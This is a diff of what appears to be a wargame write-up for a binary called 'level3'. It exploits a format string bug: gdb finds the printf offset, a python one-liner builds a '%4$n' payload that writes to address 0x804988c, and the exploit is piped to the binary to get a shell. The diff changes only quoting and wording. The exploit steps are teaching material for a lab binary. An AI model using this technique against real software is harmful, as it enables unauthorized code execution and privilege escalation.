@@ -15,18 +15,18 @@ example : "abc%n" -> %n = 3.
 
 First, let's find the offset at which printf writes in memory.
 
-python -c  'print "A" * 30 + "%x " * 8' > /tmp/abc
+python -c  "print 'A' * 30 + '%x ' * 8" > /tmp/egg
 gdb level3
 b main
-r < /tmp/abc
+r < /tmp/egg
 n
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200 b7fd1ac0 b7ff37d0 41414141 41414141 41414141 41414141 41414141 
 
 We notice that we start writing in memory at the offset 4.
 
-Finally, all is left is to add the 64 characters at address 0x804988c by doing :
+Finally, all is left is to add the 64 bytes at address 0x804988c by doing :
 
-python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/payload
+python -c "print '\x8c\x98\x04\x08' + 'A'*60 + '%4$n'" > /tmp/payload
 
 Inspecting our payload in gdb :
 b main
@@ -40,7 +40,7 @@ x/20wx $esp
 0xbffff520:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffff530:     0x41414141      0x41414141      0x41414141      0x41414141
 
-We see our payload and count our 60 + 4 characters. (15 * 4 + 4)
+We see our payload and count our 60 + 4 bytes. (15 * 4 + 4)
 
 All is left is to take control of the shell :
 cat /tmp/payload2 - | ./level3
